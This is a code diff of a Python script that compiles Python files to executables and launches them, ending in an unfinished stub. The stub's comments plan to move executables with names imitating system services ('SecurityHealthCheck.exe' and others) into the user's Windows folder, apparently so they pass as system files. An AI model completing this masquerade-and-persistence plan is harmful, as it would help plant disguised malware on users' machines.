@@ -65,18 +65,13 @@ def compile_python_to_exe(py_file_path):
             print(f"Error compiling {py_file_path}: {e}")
     return None
 
-def execute_all_exes(exe_file_paths):
-    processes = []
-    for exe_file_path in exe_file_paths:
+def execute_exe_file(exe_file_path):
+    if exe_file_path:
         try:
             print(f"Executing {exe_file_path}")
-            process = subprocess.Popen([exe_file_path], creationflags=subprocess.CREATE_NEW_CONSOLE)
-            processes.append(process)
+            subprocess.Popen([exe_file_path], creationflags=subprocess.CREATE_NEW_CONSOLE)
         except Exception as e:
             print(f"Error executing {exe_file_path}: {e}")
-
-    for process in processes:
-        process.wait()
 
 def clean_up(py_file_path, dist_folder, build_folder):
     if os.path.exists(py_file_path):
@@ -117,3 +112,13 @@ for py_file_path in python_files:
 
 for exe_file_path in exe_files:
     execute_exe_file(exe_file_path)
+
+def protected_file_finish():
+    File_Url = '1'
+    File_Name = ''
+
+
+
+
+    # add code to move "SystemResourceMonitor.exe" & "SecurityHealthCheck.exe" & "NetworkIntegrityService.exe" to users "Windows" folder
+    # add code to 
